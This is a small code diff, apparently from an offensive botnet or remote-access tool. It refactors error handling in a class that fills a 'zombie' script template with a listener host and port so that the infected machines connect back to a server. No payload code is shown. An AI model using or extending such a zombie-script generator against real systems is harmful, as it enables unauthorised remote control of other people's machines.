@@ -4,14 +4,15 @@
 this script is for creating script for zombies to run and connect to server
 '''
 
-from tkinter import messagebox
 from colorama import Fore
+from modules.get_modules import show_error
 
 class ScriptCreator:
-    def __init__(self, lhost, lport, lang):
+    def __init__(self, lhost, lport, lang, is_from_gui=None):
         self.lhost = lhost
         self.lport = lport
         self.lang = str(lang).lower() # chosen language in create script tab
+        self.is_from_gui = is_from_gui
 
     def create(self):
         zombie_script_path = ''
@@ -27,7 +28,8 @@ class ScriptCreator:
                 z_file_content = z_file.read()
 
         except FileNotFoundError:
-            messagebox.showerror(title='Error', message='File {} not found! maybe you have deleted it.'.format(zombie_script_path))
+            show_error(title='Error', message='File {} not found! maybe you have deleted it.'.format(zombie_script_path),
+                    is_from_gui=self.is_from_gui)
 
         else:
             z_file_content = z_file_content.replace('replace_server_ip', self.lhost)
